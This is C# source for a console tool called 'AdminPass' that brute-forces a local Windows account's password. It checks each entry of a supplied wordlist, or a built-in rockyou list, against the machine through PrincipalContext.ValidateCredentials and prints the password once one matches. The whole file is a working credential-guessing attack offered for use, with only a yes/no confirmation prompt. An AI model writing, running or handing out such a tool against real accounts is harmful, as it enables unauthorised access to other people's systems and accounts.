using System;
using System.IO;
using System.Diagnostics;
using System.DirectoryServices.AccountManagement;

namespace AdminPass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.CancelKeyPress += new ConsoleCancelEventHandler(BreakExit);
            //agrs scheme:
            /*
            args[0] = user
            args[1] = pathtolist
            args[2] (optional) = verbose
            */
            //it works!!!
            if(args.Length >= 2)
            {
                string target_user = args[0];
                string path = args[1];
                if(File.Exists(path))
                {
                    string[] passwords = File.ReadAllLines(path);
                    if(Confirm(target_user, path))
                    {
                        Attack(target_user, passwords);
                    }
                }
                else if(path == "-b")
                {
                    string[] passwords = AdminPass.Properties.Resources.rockyou.Split("\n");
                    if(Confirm(target_user, path))
                    {
                        Attack(target_user, passwords);
                    }
                }
            }
            else if(args.Length == 1 && args[0] == "-help")
            {
                Console.WriteLine("[Syntax] : ./AdminPass <user> <pathToWordList> (-b for built-in 'rockyou.txt')");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("AdminPass> Invalid arguments. Type ./AdminPass -help");
                Console.ForegroundColor = ConsoleColor.White;
                Environment.Exit(0);
            }
        }

        static void Attack(string user, string[] passwords)
        {
            Console.Clear();
            Stopwatch sw = new Stopwatch();
            Console.WriteLine($"Launching AdminPass on [{user}] at [{DateTime.Now}]");
            Console.ForegroundColor = ConsoleColor.Green;
            int counter = 0;
            sw.Start();
            foreach(string pass in passwords){
                var ctx = ContextType.Machine;
                PrincipalContext pCtx = new PrincipalContext(ctx);
                var res = pCtx.ValidateCredentials(user, pass);
                if(res){
                    sw.Stop();
                    RewriteLine(2,"                     Password Found!");
                    RewriteLine(3,$"[Success] Password for user : [{user}] found! Password : [{pass}]");
                    RewriteLine(5,"     [Debug Info]");
                    RewriteLine(6,$"Total Attempts : {counter}");
                    RewriteLine(7,$"Total Elapsed Time : {sw.Elapsed}");
                    RewriteLine(8,$"Average k/s : {counter/(sw.ElapsedMilliseconds / 1000)}");
                    Console.SetCursorPosition(0,10);
                    Console.ForegroundColor = ConsoleColor.White;
                    Environment.Exit(0);
                }
                else
                {
                    counter++;
                    RewriteLine(2,$"            Current Passpharse: {pass}");
                    RewriteLine(3,$"[Attempt] : Invalid password : {pass} | [{counter}/{passwords.Length}]");
                }
            }
        }

        static bool Confirm(string user, string path)
        {
            Console.WriteLine($"You are about run AdminPass on [{user}] with dictionary [{Path.GetFileName(path)}]. Confirm [y/n]: ");
            Console.Write("~$ ");
            string oput = Console.ReadLine();
            if(oput.ToLower() == "y" || oput.ToLower() == "yes")
                return true;
            else
                return false;
        } 

        public static void RewriteLine(int line, string text)
        {
            int currentlineCursor = Console.CursorTop;
            Console.SetCursorPosition(0, line);
            ClearCurrentConsoleLine();
            Console.Write(text);
            Console.SetCursorPosition(0, currentlineCursor);
        }
        public static void ClearCurrentConsoleLine()
        {
            int currentLineCursor = Console.CursorTop;
            Console.SetCursorPosition(0, Console.CursorTop);
            Console.Write(new string(' ', Console.WindowWidth)); 
            Console.SetCursorPosition(0, currentLineCursor);
        }

        protected static void BreakExit(object sender, ConsoleCancelEventArgs args)
        {
            Console.ForegroundColor = ConsoleColor.White;
            RewriteLine(4,"[Info] Process canceled successfully!");
            Console.SetCursorPosition(0,6);
        }
    }
}
